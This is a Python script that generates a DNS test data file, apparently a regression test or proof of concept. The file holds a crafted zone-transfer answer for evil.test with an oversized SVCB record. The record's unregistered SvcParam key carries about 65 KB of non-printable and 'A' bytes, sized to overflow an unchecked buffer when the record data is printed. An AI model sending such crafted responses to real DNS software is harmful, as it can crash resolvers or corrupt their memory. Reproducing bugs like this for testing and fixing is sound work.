#!/usr/bin/env python3

N_NONPRINT = 16400    # 0x01 bytes, each printed as \001 (4 chars)
M_PRINT = 48600       # 'A' bytes, each raw-written with no bound check
SVC_PARAM_KEY = 65533 # unregistered key -> generic print_svcparam path

per_line = 20
assert(N_NONPRINT % per_line == 0)
assert(M_PRINT % per_line == 0)

hex2 = lambda n: f'{n>>8:02x} {n&0xff:02x}'
SOA = '''
 c0 0c                               ;   name: evil.test.
 00 06 00 01 00 00 0e 10             ;   type:  SOA,   class:  IN, TTL: 3600
 00 21                               ;  rdlen:   33
 02 6e 73 c0 0c                      ;  mname: ns.evil.test.
 05 61 64 6d 69 6e c0 0c             ;  rname: admin.evil.test.
 00 00 00 01 00 00 00 05 00 00 00 05 ; serial:    1, refresh:   5, retry: 5
 00 00 0e 10 00 00 01 2c             ; expire: 3600, minimum: 300'''

with open('print_rdata_overflow.datafile', 'w') as fh:
    fh.write(f'''$ORIGIN test.
$TTL 400

ENTRY_BEGIN
MATCH TCP
ADJUST copy_id          ; copy_id copies the ID from the query to the answer.
HEX_ANSWER_BEGIN
 00 00 84 20                         ;  ID, Flags: QR, AA and AD
 00 01 00 03                         ;  QDCOUNT:  1, ANCOUNT:   3
 00 00 00 00                         ;  NSCOUNT:  0, ARCOUNT:   0
 04 65 76 69 6c 04 74 65 73 74 00    ;  qname: evil.test.
 00 fc 00 01                         ;  qtype: AXFR,  qclass:  IN
{SOA}

 c0 0c                               ;   name: evil.test.
 00 40 00 01 00 00 0e 10             ;   type: SVCB,   class:  IN, TTL: 3600
 {hex2(17 + N_NONPRINT + M_PRINT)}
 00 01                               ; SvcPriority: 1
 04 65 76 69 6c 04 74 65 73 74 00    ; TargetName : evil.test.
 {hex2(SVC_PARAM_KEY)} {hex2(N_NONPRINT + M_PRINT)}
{'\n '.join([' 01' * per_line] * int(N_NONPRINT / per_line))}
{'\n '.join([' 41' * per_line] * int(M_PRINT / per_line))}
{SOA}
HEX_ANSWER_END
ENTRY_END
''')
